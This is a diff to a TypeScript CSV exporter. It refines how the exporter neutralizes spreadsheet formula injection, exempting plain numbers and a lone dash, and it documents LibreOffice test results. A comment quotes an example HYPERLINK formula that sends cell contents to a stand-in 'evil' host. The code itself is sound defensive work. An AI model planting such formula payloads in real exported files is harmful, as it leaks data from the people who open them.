@@ -53,8 +53,9 @@ export interface CsvOptions {
      * Prefix `'` to every text field that a spreadsheet would read as a formula.
      * Default `true`.
      *
-     * A field starting with `=`, `+`, `-`, `@`, TAB or CR is a formula to Excel,
-     * LibreOffice and Google Sheets, and opening the file evaluates it: a name typed
+     * A field starting with `=`, `+`, `-`, `@`, TAB or CR is a formula start by the
+     * OWASP list (Excel and Google Sheets read it so; LibreOffice 26.2 evaluated only
+     * `=`), and opening the file evaluates it: a name typed
      * as `=HYPERLINK("https://evil/?d="&A1,"ver")` turns into a link that exfiltrates
      * other cells (OWASP "CSV Injection"). Measured on LibreOffice 26.2: `=1+2` was
      * imported as the formula `of:=1+2` with value `3`. The default is the safe one
@@ -62,7 +63,8 @@ export interface CsvOptions {
      * and because the app that exports rarely controls every value in it.
      *
      * Numbers are never prefixed: a `number` cell, or a text field that is only a
-     * number (`"-5"`, `"-1.234,56"`, `"+42"`, `"1e-7"`), cannot be a formula. Pass
+     * number (`"-5"`, `"-1.234,56"`, `"+42"`, `"1e-7"`), cannot be a formula, and
+     * neither can a lone `"-"`, which is left alone too. Pass
      * `false` when the file feeds another system's importer rather than a person's
      * spreadsheet, so the bytes round-trip unchanged.
      */
@@ -83,11 +85,24 @@ const PLAIN_NUMBER = /^[+-]?(?:\d+(?:[.,]\d+)*|\d*[.,]\d+)(?:e[+-]?\d+)?$/i;
 /**
  * Neutralize a text field a spreadsheet would evaluate.
  *
+ * Two shapes are exempt from the OWASP trigger list: a plain number (see
+ * {@link PLAIN_NUMBER}) and a lone `-`, the usual "no value" placeholder in a
+ * report. A lone operator has no operand, so no spreadsheet can evaluate it, and
+ * prefixing it printed `'-` in LibreOffice 26.2 where `-` read as text.
+ *
+ * Measured on LibreOffice 26.2 headless (`--infilter="CSV:59,34,76,1"`) without
+ * the prefix: `=1+2` was a formula; `+55 (11) 99999-9999`, `@maria`, a TAB before
+ * `=`, a space before `=` and a quoted newline before `=` all stayed text. The
+ * list is kept whole anyway — Excel and Google Sheets read `+`, `-`, `@` and TAB
+ * as formula starts, and that is what OWASP's list is for. A space or newline
+ * before `=` is not added: it read as text, not as a formula.
+ *
  * @param value - The already-stringified field.
  * @returns The field with a leading `'` when it would read as a formula.
  */
 function neutralizeFormula(value: string): string {
-    return FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
+    if (value === "-" || PLAIN_NUMBER.test(value)) return value;
+    return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
 }
 
 /**
